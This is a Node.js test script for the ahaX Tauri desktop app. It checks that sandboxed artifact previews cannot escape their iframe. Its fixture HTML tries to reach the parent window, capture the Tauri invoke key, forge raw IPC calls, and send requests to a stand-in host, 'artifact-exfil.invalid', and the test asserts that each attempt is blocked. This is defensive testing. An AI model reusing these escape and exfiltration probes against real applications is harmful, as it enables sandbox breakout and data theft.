import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { createHash } from 'node:crypto';
import { createServer } from 'node:http';
import { mkdir, mkdtemp, readFile, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import ts from 'typescript';
import { chromium } from '@playwright/test';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const executable = path.resolve(process.argv[2] ?? 'src-tauri/target/release/ahax.exe');
assert.equal(path.basename(executable).toLowerCase(), 'ahax.exe');
await mkdir(path.join(root, 'artifacts'), { recursive: true });
const sandbox = await mkdtemp(path.join(root, 'artifacts', 'artifact-native-smoke-'));
const codexHome = path.join(sandbox, 'codex');
const dataDirectory = path.join(sandbox, 'ahax-data');
await mkdir(codexHome);
await mkdir(dataDirectory);
await writeFile(path.join(codexHome, 'config.toml'), 'model = "preview-smoke-only"\n');
await writeFile(path.join(dataDirectory, 'update-preferences.json'), '{"autoDownload":false}');
const source = await readFile(path.join(root, 'src/lib/evaluation/artifact-document.ts'), 'utf8');
const compiled = ts.transpileModule(source, { compilerOptions: { target: ts.ScriptTarget.ES2022, module: ts.ModuleKind.ES2022 } }).outputText;
const { createArtifactDocument } = await import(`data:text/javascript;base64,${Buffer.from(compiled).toString('base64')}`);
const listen = (server) => new Promise((resolve, reject) => { server.once('error', reject); server.listen(0, '127.0.0.1', () => resolve(server.address().port)); });
const close = (server) => new Promise((resolve) => { server.closeAllConnections(); server.close(resolve); });
const unused = createServer();
const port = await listen(unused);
await close(unused);
const denyProxy = createServer((_request, response) => { response.writeHead(502); response.end(); });
denyProxy.on('connect', (_request, socket) => socket.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'));
const proxy = `http://127.0.0.1:${await listen(denyProxy)}`;
let localEscapes = 0;
const localSink = createServer((_request, response) => { localEscapes += 1; response.end('unexpected request'); });
const localUrl = `http://127.0.0.1:${await listen(localSink)}/unrelated-local-service`;
const report = { executable, sandbox, passed: false, checks: [] };
let child;
let browser;
async function until(check, label, timeout = 20000) {
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) { const result = await check(); if (result) return result; await new Promise((resolve) => setTimeout(resolve, 50)); }
  throw new Error(`Timed out: ${label}`);
}
async function cleanupSyntheticGatewayCredential() {
  let stored;
  try { stored = (await readFile(path.join(dataDirectory, 'gateway-credential-id'), 'utf8')).trim(); }
  catch (error) { if (error.code === 'ENOENT') return; throw error; }
  const digest = createHash('sha256').update(dataDirectory.toLowerCase()).digest('hex').slice(0, 32);
  const expected = `${digest.slice(0, 8)}-${digest.slice(8, 12)}-${digest.slice(12, 16)}-${digest.slice(16, 20)}-${digest.slice(20)}`;
  assert.equal(stored, expected, 'Only remove the credential derived from this isolated test directory.');
  await new Promise((resolve, reject) => {
    const command = spawn(path.join(process.env.SystemRoot, 'System32', 'cmdkey.exe'), [`/delete:ahaX/connection/${stored}`], { windowsHide: true, stdio: 'ignore' });
    command.once('error', reject);
    command.once('close', (code) => code === 0 ? resolve() : reject(new Error('Could not remove the synthetic gateway credential.')));
  });
}
try {
  child = spawn(executable, [], {
    cwd: path.dirname(executable), windowsHide: true, stdio: 'ignore',
    env: { ...process.env, CODEX_HOME: codexHome, AHAX_DATA_DIR: dataDirectory, HTTP_PROXY: proxy, HTTPS_PROXY: proxy, ALL_PROXY: proxy, NO_PROXY: '127.0.0.1,localhost', WEBVIEW2_USER_DATA_FOLDER: path.join(sandbox, 'webview'), WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS: `--remote-debugging-port=${port} --no-proxy-server` },
  });
  let launchError;
  child.once('error', (error) => { launchError = error; });
  await until(async () => {
    if (launchError) throw launchError;
    assert.equal(child.exitCode, null);
    try { return (await fetch(`http://127.0.0.1:${port}/json/version`, { signal: AbortSignal.timeout(300) })).ok; } catch { return false; }
  }, 'WebView2 startup', 30000);
  browser = await chromium.connectOverCDP(`http://127.0.0.1:${port}`);
  const page = browser.contexts()[0].pages()[0] ?? await browser.contexts()[0].waitForEvent('page');
  page.setDefaultTimeout(15000);
  report.console = [];
  report.blockedFonts = 0;
  page.on('console', (message) => {
    if (message.text().includes("font-src 'self'") && message.text().includes('data:font/')) report.blockedFonts += 1;
    if (/IPC custom protocol failed|Couldn.t find callback|ipc.localhost|artifact-exfil.invalid/.test(message.text())) report.console.push(message.text());
  });
  await page.waitForFunction(() => !!window.__TAURI_INTERNALS__?.invoke);
  assert(!page.url().includes('127.0.0.1:1420'));
  const invoke = (command, args = {}) => page.evaluate(({ command, args }) => window.__TAURI_INTERNALS__.invoke(command, args), { command, args });
  assert.equal(path.resolve((await invoke('get_dashboard')).environment.configPath), path.join(codexHome, 'config.toml'));
  const escapedRequests = [];
  await page.route('https://artifact-exfil.invalid/**', (route) => { escapedRequests.push(route.request().url()); return route.abort(); });
  const rawCallbacks = await page.evaluate(() => {
    window.__artifactRawResponses = [];
    return Object.fromEntries(['get_dashboard', 'create_artifact_preview'].map((command) => [command, {
      callback: window.__TAURI_INTERNALS__.transformCallback(() => window.__artifactRawResponses.push({ command, succeeded: true }), true),
      error: window.__TAURI_INTERNALS__.transformCallback((message) => window.__artifactRawResponses.push({ command, succeeded: false, message: String(message) }), true),
    }]));
  });
  const token = 'isolated-native-fixture';
  const html = createArtifactDocument(`<body><svg width="500" height="300"><circle id="wheel" cx="20" cy="80" r="15"><animate attributeName="cx" values="20;400;20" dur="2s" repeatCount="indefinite"/></circle></svg><output id="counter">0</output><script>
    window.probe={native:typeof window.__TAURI_INTERNALS__,rawIpc:typeof window.ipc};
    const originalFetch=window.fetch.bind(window);let capturedInvokeKey;
    window.fetch=(input,options)=>{const key=options?.headers?.get?.('Tauri-Invoke-Key');if(key)capturedInvokeKey=key;return originalFetch(input,options)};
    try{parent.document.body.dataset.compromised='true';probe.parent=true}catch{probe.parent=false}
    try{parent.__TAURI_INTERNALS__.invoke('get_dashboard');probe.parentIpc=true}catch{probe.parentIpc=false}
    if(window.__TAURI_INTERNALS__?.invoke){window.__TAURI_INTERNALS__.invoke('get_dashboard').then(()=>probe.nativeIpc=true,()=>probe.nativeIpc=false);window.__TAURI_INTERNALS__.invoke('create_artifact_preview',{html:'<p>escape</p>'}).then(()=>probe.nativeCreate=true,()=>probe.nativeCreate=false)}else{probe.nativeIpc=false;probe.nativeCreate=false}
    if(capturedInvokeKey&&window.ipc?.postMessage){for(const [cmd,callbacks]of Object.entries(${JSON.stringify(rawCallbacks)})){window.ipc.postMessage(JSON.stringify({cmd,...callbacks,payload:cmd==='create_artifact_preview'?{html:'<p>raw IPC side effect probe</p>'}:{},options:{customProtocolIpcBlocked:true},__TAURI_INVOKE_KEY__:capturedInvokeKey}))}probe.rawAttempted=true}else probe.rawAttempted=false;
    window.fetch=originalFetch;
    fetch('https://artifact-exfil.invalid/fetch').then(()=>probe.fetch=true,()=>probe.fetch=false);
    const image=new Image();image.src='https://artifact-exfil.invalid/image';
    let count=0;function tick(){document.getElementById('counter').textContent=String(++count);requestAnimationFrame(tick)}requestAnimationFrame(tick);
  </script></body>`, token);
  const location = await invoke('create_artifact_preview', { html });
  await page.evaluate((url) => {
    const frame = document.createElement('iframe');
    frame.id = 'native-artifact-fixture'; frame.title = 'Native artifact fixture'; frame.sandbox.add('allow-scripts'); frame.src = url;
    Object.assign(frame.style, { position: 'fixed', inset: '100px', width: '700px', height: '450px', zIndex: '99999', background: '#fff' });
    document.body.append(frame);
  }, location.url);
  const frame = page.frameLocator('#native-artifact-fixture');
  await until(async () => Number(await frame.locator('#counter').textContent()) > 3, 'inline JS animation');
  await until(async () => await frame.locator('#wheel').evaluate((circle) => circle.cx.animVal.value > 30), 'SMIL motion');
  report.initialProbe = await frame.locator('body').evaluate(() => window.probe);
  await until(() => frame.locator('body').evaluate(() => typeof window.probe.fetch === 'boolean'), 'network isolation probe completion');
  await new Promise((resolve) => setTimeout(resolve, 350));
  const probe = await frame.locator('body').evaluate(() => window.probe);
  assert.equal(probe.parent, false);
  assert.equal(probe.parentIpc, false);
  assert.notEqual(probe.nativeIpc, true);
  assert.notEqual(probe.nativeCreate, true);
  assert.equal(probe.fetch, false);
  assert.equal(probe.rawAttempted, true);
  report.rawIpcResponses = await page.evaluate(() => window.__artifactRawResponses);
  assert(!report.rawIpcResponses.some((response) => response.succeeded));
  report.isolation = probe;
  assert(report.console.some((message) => message.includes('ipc.localhost/get_dashboard') && message.includes("connect-src 'none'")));
  assert(report.console.some((message) => message.includes('ipc.localhost/create_artifact_preview') && message.includes("connect-src 'none'")));
  const capacityProbes = [];
  try {
    for (let index = 0; index < 127; index += 1) capacityProbes.push(await invoke('create_artifact_preview', { html: '<p>Isolated capacity probe</p>' }));
    await assert.rejects(invoke('create_artifact_preview', { html: '<p>Capacity boundary</p>' }), /当前预览较多/);
  } finally {
    for (const preview of capacityProbes) await invoke('release_artifact_preview', { id: preview.id });
  }
  report.nativeIpc = { httpTransportBlockedByCsp: true, fallbackReturnedToChild: typeof probe.nativeCreate === 'boolean', directRawIpcAttempted: probe.rawAttempted, unexpectedPreviewRegistrations: 0, remainingPreviewSlots: capacityProbes.length };
  report.checks.push('Packaged WebView2 executes animation while blocking parent access, network and HTTP IPC; child fallback creates no backend preview');
  const sendPlayback = (playing) => page.evaluate(({ token, playing }) => document.querySelector('#native-artifact-fixture').contentWindow.postMessage({ type: 'ahax:artifact-playback', token, playing }, '*'), { token, playing });
  await sendPlayback(false);
  await until(() => frame.locator('svg').evaluate((svg) => svg.animationsPaused()), 'SMIL pause');
  const before = await frame.locator('#counter').textContent();
  await new Promise((resolve) => setTimeout(resolve, 150));
  assert.equal(await frame.locator('#counter').textContent(), before);
  await sendPlayback(true);
  await until(async () => Number(await frame.locator('#counter').textContent()) > Number(before) + 3, 'resume JS animation');
  report.checks.push('Packaged JavaScript and SMIL animations pause and resume');
  await mkdir(path.join(root, 'artifacts/screenshots'), { recursive: true });
  await page.screenshot({ path: path.join(root, 'artifacts/screenshots/native-artifact-preview.png') });
  await frame.locator('body').evaluate(() => { location.href = 'https://artifact-exfil.invalid/self'; });
  await new Promise((resolve) => setTimeout(resolve, 200));
  assert.deepEqual(escapedRequests, []);
  await page.locator('#native-artifact-fixture').evaluate((element) => element.remove());
  await invoke('release_artifact_preview', { id: location.id });
  assert.equal((await fetch(location.url)).status, 404);
  report.checks.push('Embedding CSP blocks self-navigation and released preview documents become unavailable');
  for (const generated of [
    `<body>Local navigation<script>setTimeout(()=>location.href=${JSON.stringify(localUrl)},50)</script></body>`,
    `<meta http-equiv="refresh" content="0;url=${localUrl}"><body>Local refresh</body>`,
    `<body>Top navigation<script>try{top.location.href=${JSON.stringify(localUrl)}}catch{}</script></body>`,
  ]) {
    const next = await invoke('create_artifact_preview', { html: createArtifactDocument(`<script>parent.postMessage({type:'native-fixture-attempt'},'*')</script>${generated}`, token) });
    await page.evaluate((url) => {
      const frame = document.createElement('iframe'); frame.id = 'native-navigation-fixture'; frame.sandbox.add('allow-scripts'); frame.src = url;
      window.__artifactNavigationAttempt = false;
      const markAttempt = (event) => { if (event.source === frame.contentWindow && event.data?.type === 'native-fixture-attempt') { window.__artifactNavigationAttempt = true; removeEventListener('message', markAttempt); } };
      addEventListener('message', markAttempt);
      document.body.append(frame);
    }, next.url);
    await until(() => page.evaluate(() => window.__artifactNavigationAttempt === true), 'navigation fixture execution');
    await new Promise((resolve) => setTimeout(resolve, 200));
    assert.equal(localEscapes, 0);
    await page.locator('#native-navigation-fixture').evaluate((element) => element.remove());
    await invoke('release_artifact_preview', { id: next.id });
  }
  report.checks.push('Native location, meta-refresh and top navigation cannot reach another localhost service');
  assert.equal(await readFile(path.join(codexHome, 'config.toml'), 'utf8'), 'model = "preview-smoke-only"\n');
  assert.equal(report.blockedFonts, 0, 'The packaged host must allow its bundled data fonts.');
  report.passed = true;
} catch (error) {
  report.error = String(error.stack ?? error);
  process.exitCode = 1;
} finally {
  if (browser) await browser.close().catch(() => {});
  if (child && child.exitCode === null) {
    const exit = new Promise((resolve, reject) => {
      const deadline = setTimeout(() => reject(new Error('Isolated application did not exit.')), 10000);
      child.once('exit', () => { clearTimeout(deadline); resolve(); });
    });
    child.kill();
    await exit.catch((error) => { report.cleanupError = String(error); report.passed = false; process.exitCode = 1; });
  }
  await cleanupSyntheticGatewayCredential().catch((error) => { report.cleanupError = String(error); report.passed = false; process.exitCode = 1; });
  await close(denyProxy);
  await close(localSink);
  await writeFile(path.join(sandbox, 'report.json'), JSON.stringify(report, null, 2));
  console.log(JSON.stringify(report, null, 2));
}
